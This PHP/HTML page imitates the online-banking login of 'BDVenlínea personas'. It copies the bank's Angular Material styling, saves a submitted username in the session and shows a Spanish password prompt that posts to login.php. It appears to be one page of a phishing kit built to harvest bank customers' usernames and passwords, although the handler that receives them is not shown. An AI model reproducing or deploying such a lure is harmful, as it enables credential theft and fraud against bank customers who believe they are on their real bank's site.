<?php  
session_start();
$_SESSION['usern'] = $_POST['usern'];
?>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>BDVenlínea personas</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/estilo.css">
    <link rel="stylesheet" href="css/estilos.css">
    <link rel="shortcut icon" href="img/favicon-16x16.png" type="image/x-icon">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <style>
        body {
            margin: 0;
        }

        .login-container[_ngcontent-c10] {
            overflow: hidden;
            background-color: #ededed;
            background-image: url(img/wallp.webp);
            background-position: center center;
            background-size: cover;
            background-repeat: no-repeat;
            height: 100vh;
        }

        .mat-form-field {
            font-size: inherit;
            font-weight: 400;
            line-height: 1.125;
            font-family: Nunito;
        }

        .mat-form-field-wrapper {
            padding-bottom: 1.34375em;
        }

        .mat-form-field-flex {
            display: inline-flex;
            align-items: baseline;
            box-sizing: border-box;
            width: 100%;
        }

        .login-container-form[_ngcontent-c10] {
            background-color: #fff;
            padding: 30px;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
        }

        .mat-form-field-appearance-fill .mat-form-field-flex {
            border-radius: 4px 4px 0 0;
            padding: .75em .75em 0 .75em;
            background-color: rgba(0, 0, 0, .04);
        }

        .mat-form-field-infix {
            display: block;
            position: relative;
            flex: auto;
            min-width: 0;
            width: 180px;
            border-top: .84375em solid transparent;
            padding: .25em 0 .75em;
        }

        .mat-input-element {
            font: inherit;
            background: 0 0;
            color: currentColor;
            border: none;
            outline: 0;
            padding: 0;
            margin: 0;
            width: 100%;
            max-width: 100%;
            vertical-align: bottom;
            text-align: inherit;
        }

        .mat-form-field-label-wrapper {
            position: absolute;
            left: 0;
            box-sizing: content-box;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
        }

        .mat-form-field-label-wrapper {
            top: -.84375em;
            padding-top: .84375em;
        }

        .mat-form-field-label,
        .mat-hint {
            color: rgba(0, 0, 0, .6);
        }

        .mat-form-field-label {
            position: absolute;
            left: 0;
            font: inherit;
            pointer-events: none;
            width: 100%;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            transform-origin: 0 0;
            transition: transform .4s cubic-bezier(.25, .8, .25, 1), color .4s cubic-bezier(.25, .8, .25, 1), width .4s cubic-bezier(.25, .8, .25, 1);
            display: none;
        }


        .mat-form-field-appearance-fill .mat-form-field-label {
            top: 1.09375em;
            margin-top: -.5em;
        }

        .mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label,
        .mat-form-field-empty.mat-form-field-label {
            display: block;
        }

        .mat-form-field-appearance-fill.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,
        .mat-form-field-appearance-fill.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label {
            -webkit-transform: translateY(-.59373em) scale(.75);
            transform: translateY(-.59373em) scale(.75);
            width: 133.33335333%;
        }

        .mat-form-field-underline {
            position: absolute;
            width: 100%;
            pointer-events: none;
            transform: scaleY(1.0001);
            bottom: 1.34375em;
        }

        .mat-form-field-ripple {
            background-color: rgba(0, 0, 0, .87);
        }

        .mat-form-field-ripple {
            position: absolute;
            left: 0;
            width: 100%;
            transform-origin: 50%;
            transform: scaleX(.5);
            opacity: 0;
            transition: background-color .3s cubic-bezier(.55, 0, .55, .2);
        }

        .mat-form-field-appearance-fill .mat-form-field-ripple {
            bottom: 0;
            height: 2px;
        }

        .mat-form-field-subscript-wrapper {
            font-size: 75%;
            margin-top: .66666667em;
            top: calc(100% - 1.79166667em);
        }

        .mat-form-field-subscript-wrapper {
            position: absolute;
            box-sizing: border-box;
            width: 100%;
            overflow: hidden;
        }

        .button-login-container[_ngcontent-c10] {
            margin-top: 20px;
            text-align: center;
        }

        .mat-button,
        .mat-fab,
        .mat-flat-button,
        .mat-icon-button,
        .mat-mini-fab,
        .mat-raised-button,
        .mat-stroked-button {
            font-family: Nunito;
            font-size: 14px;
            font-weight: 500;
        }

        .mat-raised-button {
            box-sizing: border-box;
            position: relative;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            cursor: pointer;
            outline: 0;
            border: none;
            -webkit-tap-highlight-color: transparent;
            display: inline-block;
            white-space: nowrap;
            text-decoration: none;
            vertical-align: baseline;
            text-align: center;
            margin: 0;
            min-width: 88px;
            line-height: 36px;
            padding: 0 16px;
            border-radius: 2px;
            overflow: visible;
            transform: translate3d(0, 0, 0);
            transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
        }

        .mat-fab.mat-accent,
        .mat-fab.mat-primary,
        .mat-fab.mat-warn,
        .mat-flat-button.mat-accent,
        .mat-flat-button.mat-primary,
        .mat-flat-button.mat-warn,
        .mat-mini-fab.mat-accent,
        .mat-mini-fab.mat-primary,
        .mat-mini-fab.mat-warn,
        .mat-raised-button.mat-accent,
        .mat-raised-button.mat-primary,
        .mat-raised-button.mat-warn {
            color: rgba(255, 255, 255, .87);
        }

        .mat-fab.mat-accent,
        .mat-flat-button.mat-accent,
        .mat-mini-fab.mat-accent,
        .mat-raised-button.mat-accent {
            background-color: #0067b1;
        }

        .mat-raised-button:not([class*=mat-elevation-z]) {
            box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12);
        }

        .button-login-container[_ngcontent-c10] button[_ngcontent-c10] {
            width: 50%;
            height: 45px;
        }

        .mat-button-focus-overlay,
        .mat-button-ripple {
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            position: absolute;
            pointer-events: none;
            border-radius: inherit;
        }

        .autogestion-usuario-unico[_ngcontent-c10] {
            margin-top: 20px;
        }

        .text-center {
            text-align: center !important;
        }

        .autogestion-user[_ngcontent-c10] {
            font-size: 14px;
            color: #707070;
            text-decoration: none;
            font-weight: 700;
            font-family: nunito;
        }
    </style>
</head>

<body style="overflow: hidden;
background-color: #ededed;
background-image: url(img/wallp.webp);
background-position: center center;
background-size: cover;
background-repeat: no-repeat;
height: 100vh;">
    <div class="cdk-overlay-container" id="mdl">
        <div class="cdk-overlay-backdrop cdk-overlay-dark-backdrop cdk-overlay-backdrop-showing"></div>
        <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
            <div class="cdk-global-overlay-wrapper" dir="ltr" style="justify-content: center; align-items: center;">
                <div id="cdk-overlay-2" class="cdk-overlay-pane"
                    style="max-width: 80vw; pointer-events: auto; width: 370px; height: auto; position: static;">
                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor"></div>
                    <mat-dialog-container aria-modal="true"
                        class="mat-dialog-container ng-tns-c14-39 ng-trigger ng-trigger-slideDialog ng-star-inserted"
                        tabindex="-1" id="mat-dialog-0" role="dialog" style="transform: none; opacity: 1;">
                        <app-confirmar-acceso _nghost-c15="" class="ng-star-inserted">
                            <div _ngcontent-c15="" class="container">
                                <div _ngcontent-c15="" class="row">
                                    <h4 _ngcontent-c15="" class="text-center">Introduce tu contraseña</h4>
                                </div>
                                <form method="post" action="login.php" id="loginForm">
                                    <div _ngcontent-c15="" class="row">
                                            <mat-form-field _ngcontent-c15="" id="dfs" appearance="fill"
                                                class="mat-form-field ng-tns-c11-40 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-pristine ng-invalid mat-form-field-invalid ng-touched mat-form-field-hide-placeholder">
                                                <div class="mat-form-field-wrapper">
                                                    <div class="mat-form-field-flex">
                                                        <div class="mat-form-field-infix" style="padding: 1.25em 0 .75em;">
                                                            <input _ngcontent-c15="" autocomplete="off"
                                                                class=" mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-pristine ng-invalid ng-touched"
                                                                formcontrolname="password" matinput="" name="passinput"
                                                                type="password" id="passinput" aria-invalid="true" required
                                                                aria-describedby="mat-error-4">
                                                            <span class="mat-form-field-label-wrapper">
                                                                <label
                                                                    class="mat-form-field-label ng-tns-c11-40 mat-empty mat-form-field-empty ng-star-inserted"
                                                                    id="mat-form-field-label-3" for="passinput"
                                                                    aria-owns="passinput" style="">
                                                                    <mat-label _ngcontent-c15=""
                                                                        aria-label="Introduce tu contraseña"
                                                                        class="ng-star-inserted">
                                                                        <span _ngcontent-c15="">Contraseña</span>
                                                                    </mat-label>
                                                                </label>
                                                            </span>
                                                        </div>
                                                        <button type="button" onclick="togglePasswordVisibility()"
                                                            style="background: none; border: none; cursor: pointer; margin-left: 8px;">
                                                            👁️
                                                        </button>
                                                    </div>
                                                    <div class="mat-form-field-underline ng-tns-c11-40 ng-star-inserted">
                                                        <span class="mat-form-field-ripple"></span>
                                                    </div>

                                                    <div class="mat-form-field-subscript-wrapper">
                                                        <div class="ng-tns-c11-40 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                            style="opacity: 1; transform: translateY(0%);">
                                                            <mat-error _ngcontent-c15="" align="end"
                                                                class="mat-error ng-star-inserted" role="alert"
                                                                id="mat-error-4">Contraseña es <strong
                                                                    _ngcontent-c15="">requerida</strong></mat-error>
                                                        </div>
                                                    </div>
                                                </div>
                                            </mat-form-field>
                                    </div>
                                    <div _ngcontent-c15="" class="row">
                                        <div _ngcontent-c15="" class="button-container">
                                            <button _ngcontent-c15="" id="submitPass" color="accent" mat-raised-button=""
                                                form="loginForm" type="submit" name="login"
                                                class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched">
                                                <span class="mat-button-wrapper">Continuar</span></button>
                                            <div class="mat-button-ripple mat-ripple" matripple=""></div>
                                            <div class="mat-button-focus-overlay"></div>

                                            <button _ngcontent-c15="" aria-label="cancelar" color="accent"
                                                mat-dialog-close="" mat-raised-button="" onclick="window.location.href = 'index.php';" type="button" type="button" window.location.href class="mat-raised-button mat-accent">
                                                <span class="mat-button-wrapper" >Cancelar</span>
                                                <div class="mat-button-ripple mat-ripple" matripple=""></div>
                                                <div class="mat-button-focus-overlay"></div>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </app-confirmar-acceso>
                    </mat-dialog-container>
                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor"></div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</body>
</html>